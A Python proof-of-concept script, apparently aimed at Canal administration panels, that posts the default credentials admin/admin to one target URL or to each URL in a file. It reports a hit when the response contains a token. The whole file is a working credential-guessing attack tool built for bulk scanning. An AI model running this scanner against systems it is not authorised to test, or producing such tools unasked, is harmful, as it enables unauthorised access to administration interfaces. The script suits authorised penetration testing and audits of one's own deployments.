# -*- coding: utf-8 -*-
import requests
import argparse
import time

def banner():
    print("""
                   _                                              _ 
                  | |                                            | |
__      _____  __ _| | ___ __   __ _ ___ _____      _____  _ __ __| |
\ \ /\ / / _ \/ _` | |/ / '_ \ / _` / __/ __\ \ /\ / / _ \| '__/ _` |
 \ V  V /  __/ (_| |   <| |_) | (_| \__ \__ \\ V  V / (_) | | | (_| |
  \_/\_/ \___|\__,_|_|\_\ .__/ \__,_|___/___/ \_/\_/ \___/|_|  \__,_|
                        | |                                          
                        |_|                                          

    tag: This is a canal admin weak Password poc  
    @author: zxy
    @version: 1.0.0
    """)

# 弱口令列表，格式为 (username, password)
weak_credentials = [
    ("admin", "admin"),
]

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Content-Type": "application/json;charset=UTF-8"
}

def test_weak_credentials(target_url, credentials, delay=0):
    for username, password in credentials:
        session = requests.Session()
        login_data = {
            "username": username,
            "password": password,
        }

        try:
            response = session.post(target_url, data=login_data)
            if "token" in response.text:
                print(f"[+] Weak credentials found: {username}:{password}")
            else:
                print(f"[-] Failed with {username}:{password}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Error with {username}:{password}: {str(e)}")

        # 添加延迟，以防止请求过于频繁
        time.sleep(delay)

def main():
    banner()
    parser = argparse.ArgumentParser(description='Weak Credentials Vulnerability Scanner')
    parser.add_argument("-u", "--url", dest="url", type=str, help="example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="urls.txt")
    parser.add_argument("-d", "--delay", dest="delay", type=float, default=0, help="Delay between requests in seconds")
    args = parser.parse_args()

    if args.url:
        test_weak_credentials(args.url, credentials=weak_credentials, delay=args.delay)
    elif args.file:
        with open(args.file, "r") as url_file:
            for line in url_file:
                target_url = line.strip()
                test_weak_credentials(target_url, credentials=weak_credentials, delay=args.delay)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
